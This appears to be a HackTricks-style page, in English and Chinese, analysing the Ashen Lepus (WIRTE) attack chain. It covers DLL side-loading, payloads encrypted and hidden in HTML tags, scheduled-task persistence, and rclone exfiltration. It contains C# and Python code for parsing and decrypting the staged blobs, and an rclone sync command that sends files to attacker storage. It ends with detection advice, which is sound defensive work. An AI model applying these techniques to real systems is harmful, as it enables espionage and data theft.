# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) 将一个可重复使用的模式武器化，该模式将 DLL sideloading、分阶段 HTML 有载荷和模块化 .NET 后门串联起来，以在中东外交网络中维持持久性。该技术对任何操作者都是可重用的，因为它依赖于：

- **Archive-based social engineering**: 良性的 PDF 指示目标从文件共享站点下载一个 RAR 存档。该存档打包了一个看起来真实的文档查看器 EXE、一个以受信任库命名的恶意 DLL（例如 `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`）以及一个诱饵 `Document.pdf`。
- **DLL search order abuse**: 受害者双击 EXE，Windows 从当前目录解析 DLL 导入，恶意加载器 (AshenLoader) 在受信任进程中执行，同时诱饵 PDF 被打开以避免引起怀疑。
- **Living-off-the-land staging**: 每个后续阶段（AshenStager → AshenOrchestrator → modules）在需要之前都不落盘，而是作为加密 blob 隐藏在看似无害的 HTML 响应中传送。

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loads AshenLoader，后者执行主机侦察，对其进行 AES-CTR 加密，并通过如 `token=`, `id=`, `q=`, 或 `auth=` 等轮换参数将其作为 POST 内容发送到类似 API 的路径（例如 `/api/v2/account`）。
2. **HTML extraction**: C2 仅在客户端 IP 定位到目标区域且 `User-Agent` 与植入体匹配时才暴露下一个阶段，从而挫败沙箱。当检查通过时，HTTP 正文包含一个 `<headerp>...</headerp>` blob，内含经过 Base64/AES-CTR 加密的 AshenStager 有载荷。
3. **Second sideload**: 使用另一个导入 `wtsapi32.dll` 的合法二进制部署 AshenStager。注入到该二进制的恶意副本会获取更多 HTML，这次解析 `<article>...</article>` 以恢复 AshenOrchestrator。
4. **AshenOrchestrator**: 一个模块化的 .NET 控制器，用于解码 Base64 JSON 配置。配置的 `tg` 和 `au` 字段被串联/哈希成 AES 密钥，用以解密 `xrk`。得到的字节作为对随后获取的每个模块 blob 的 XOR 密钥。
5. **Module delivery**: 每个模块通过 HTML 注释进行描述，注释会将解析器重定向到任意标签，从而打破只查找 `<headerp>` 或 `<article>` 的静态规则。模块包括持久化（`PR*`）、卸载器（`UN*`）、侦察（`SN`）、屏幕捕获（`SCT`）和文件探索（`FE`）。

### HTML 容器解析模式
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
即使防御方屏蔽或删除了某个特定元素，操作者只需更改 HTML 注释中提示的标签即可恢复投送。

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

最近的 HTML smuggling 研究（Talos）指出，载荷会以 Base64 字符串形式隐藏在 HTML 附件的 `<script>` 区块中，并在运行时通过 JavaScript 解码。相同的技巧可以用于 C2 响应：在 script 标签（或其他 DOM 元素）中分阶段嵌入加密 blob，并在内存中解码然后进行 AES/XOR 处理，使页面看起来像普通的 HTML。

## Crypto & C2 Hardening

- **AES-CTR everywhere**：当前的 loaders 嵌入了 256-bit 密钥和 nonces（例如 `{9a 20 51 98 ...}`），并可选地在解密前/后使用像 `msasn1.dll` 这样的字符串再加一层 XOR。
- **Infrastructure split + subdomain camouflage**：staging 服务器按工具分离，分布在不同 ASN，并且有时由看似合法的子域作前置，因此烧掉一层并不会暴露其余部分。
- **Recon smuggling**：枚举的数据现在包含 Program Files 列表以识别高价值应用，并且在离开主机前总是被加密。
- **URI churn**：查询参数和 REST 路径在活动间轮换（`/api/v1/account?token=` → `/api/v2/account?auth=`），使脆弱的检测失效。
- **Gated delivery**：服务器有地理/客户端限制，仅响应真实 implants。未授权的客户端则收到无可疑的 HTML。

## Persistence & Execution Loop

AshenStager 会放置伪装成 Windows 维护任务的 scheduled tasks，并通过 `svchost.exe` 执行，例如：

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

这些任务会在启动或定期间隔重新启动 sideloading 链，确保 AshenOrchestrator 能在不再触盘的情况下请求新模块。

## Using Benign Sync Clients for Exfiltration

操作者通过专用模块将外交文件暂存到 `C:\Users\Public`（对所有用户可读且不显眼），然后下载合法的 [Rclone](https://rclone.org/) 二进制来同步该目录到攻击者的存储。Unit42 指出，这是该行为体首次被观察到使用 Rclone 进行 exfiltration，符合滥用合法同步工具以融入正常流量的更广泛趋势：

1. **暂存**：将目标文件复制/收集到 `C:\Users\Public\{campaign}\`。
2. **配置**：部署指向攻击者控制的 HTTPS 端点（例如 `api.technology-system[.]com`）的 Rclone 配置。
3. **同步**：运行 `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`，使流量看起来像正常的云备份。

由于 Rclone 在合法备份工作流中被广泛使用，防御方应侧重于异常执行（新二进制、可疑 remotes，或突然同步 `C:\Users\Public` 的行为）。

## Detection Pivots

- 对意外从用户可写路径加载 DLL 的已签名进程发出告警（Procmon 过滤 + `Get-ProcessMitigation -Module`），尤其当 DLL 名称与 `netutils`、`srvcli`、`dwampi` 或 `wtsapi32` 重叠时。
- 检查可疑的 HTTPS 响应，查找嵌入在异常标签内的大的 Base64 blob，或被 `<!-- TAG: <xyz> -->` 注释保护的内容。
- 将 HTML 搜索扩展到 `<script>` 区块内的 Base64 字符串（HTML smuggling 风格的 staging），这些字符串在 AES/XOR 处理前通过 JavaScript 解码。
- 搜索运行 `svchost.exe` 且带有非服务参数的 scheduled tasks，或指回 dropper 目录的任务。
- 监控 Rclone 二进制出现在非 IT 管理位置、新的 `rclone.conf` 文件，或从像 `C:\Users\Public` 这样的 staging 目录拉取的同步任务。

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
